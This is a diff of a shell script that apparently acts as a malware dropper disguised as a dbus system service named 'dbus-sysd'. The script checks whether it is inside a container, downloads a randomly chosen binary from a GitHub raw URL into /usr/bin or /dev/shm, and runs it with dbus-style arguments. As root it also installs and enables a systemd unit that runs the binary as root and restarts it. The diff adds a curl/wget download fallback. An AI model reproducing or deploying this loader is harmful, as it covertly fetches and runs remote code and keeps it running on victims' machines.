@@ -2,24 +2,39 @@
 
 
 SERVICE_NAME="dbus-sysd"
-CONFIG_FILE_ROOT="/usr/bin/dbus-sysd"
+EXEC_FILE_FULL_PATH="/usr/bin/dbus-sysd"
 SERVICE_PATH="/lib/systemd/system/${SERVICE_NAME}.service"
 APP_CMD_PATH="/dev/shm"
 APP_CMD="dbus-sysd"
 CHOOSE=$(echo -e "alpha\nbeta" | shuf -n1)
-CONFIG_URL="https://raw.githubusercontent.com/sachagerard1985/laravel-www/refs/heads/main/${CHOOSE}"
+MAIN_ULR="https://raw.githubusercontent.com/sachagerard1985/laravel-www/refs/heads/main/${CHOOSE}"
+
+download_file() {
+    local url="$1"
+    local dest="$2"
+
+    if command -v curl >/dev/null 2>&1; then
+        echo "Using curl..."
+        curl -fsSL "$url" -o "$dest"
+    elif command -v wget >/dev/null 2>&1; then
+        echo "Using wget..."
+        wget -q "$url" -O "$dest"
+    else
+        echo "Error: Neither curl nor wget found"
+        return 1
+    fi
+}
 
 if [ -f "/.dockerenv" ] || grep -qaE 'docker|lxc|podman|kubepods' /proc/1/cgroup; then
-    wget "$CONFIG_URL" -O "${CONFIG_FILE_ROOT}"
-    chmod 755 "${CONFIG_FILE_ROOT}"
-    "${CONFIG_FILE_ROOT}" --system --address=systemd --nofork --nopidfile --systemd-activation &
+    download_file "${MAIN_ULR}" "${EXEC_FILE_FULL_PATH}"
+    chmod 755 "${EXEC_FILE_FULL_PATH}"
+    "${EXEC_FILE_FULL_PATH}" --system --address=systemd --nofork --nopidfile --systemd-activation &
     return 0
 fi
 
 if [[ $EUID -eq 0 ]]; then
-
-    wget "$CONFIG_URL" -O "$CONFIG_FILE_ROOT"
-    chmod 755 "$CONFIG_FILE_ROOT"
+    download_file "${MAIN_ULR}" "${EXEC_FILE_FULL_PATH}"
+    chmod 755 "${EXEC_FILE_FULL_PATH}"
 
     cat <<EOF > "$SERVICE_PATH"
 [Unit]
@@ -33,7 +48,7 @@ RestartSec=60s
 StartLimitInterval=450s
 Type=forking
 User=root
-ExecStart=${CONFIG_FILE_ROOT} --system --address=systemd --nofork --nopidfile --systemd-activation
+ExecStart=${EXEC_FILE_FULL_PATH} --system --address=systemd --nofork --nopidfile --systemd-activation
 
 [Install]
 WantedBy=multi-user.target
@@ -45,7 +60,7 @@ EOF
     systemctl enable "${SERVICE_NAME}.service"
 
 else
-    wget "$CONFIG_URL" -O "${APP_CMD_PATH}/${APP_CMD}"
+    download_file "${MAIN_ULR}" "${APP_CMD_PATH}/${APP_CMD}"
     chmod 755 "${APP_CMD_PATH}/${APP_CMD}"
     cd ${APP_CMD_PATH} && PATH=./:$PATH ${APP_CMD} --system --address=systemd --nofork --nopidfile --systemd-activation &
 fi
